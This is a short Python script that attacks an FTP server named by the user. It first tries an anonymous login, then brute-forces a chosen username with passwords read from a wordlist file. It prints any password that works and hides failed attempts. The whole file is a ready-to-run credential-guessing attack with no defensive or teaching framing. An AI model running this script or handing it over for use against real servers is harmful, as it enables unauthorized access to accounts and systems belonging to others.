import ftplib

def check_anonymous_login(ip_target):
    print("Checking for anonymous logins ...")
    try:
        ftp = ftplib.FTP(ip_target)
        ftp.login()
        print("Anonymous login successful")
        print(f"Welcome Message : {ftp.getwelcome()}")
        ftp.quit()
        return True
    except Exception as e:
        print(f"Anonymous login failed: {e}")
        return False

def ftp_bruteforce(username, ip_target):
    with open("passwords.txt") as fich:
        print("Bruteforcing ...")
        attempt_count = 0
        for password in fich:
            password = password.strip()
            try:
                ftp = ftplib.FTP(ip_target)
                ftp.login(username=username, passwd=password)
                print(f"FTP login successful with password: {password}")
                ftp.quit()
                return True
            except ftplib.error_perm:
                # Suppress failed login messages
                pass
            except Exception as e:
                print(f"Error: {e}")
            attempt_count += 1
            if attempt_count % 10 == 0:
                print(f"{attempt_count} attempts made...")
    print("Bruteforce attack failed")
    return False

def ftp_global():
    username = input("What is the targeted username? ")
    ip = input("What is the targeted IP? ")
    # Start with anonymous login
    if not check_anonymous_login(ip):
        # Try bruteforce
        ftp_bruteforce(username, ip)

ftp_global()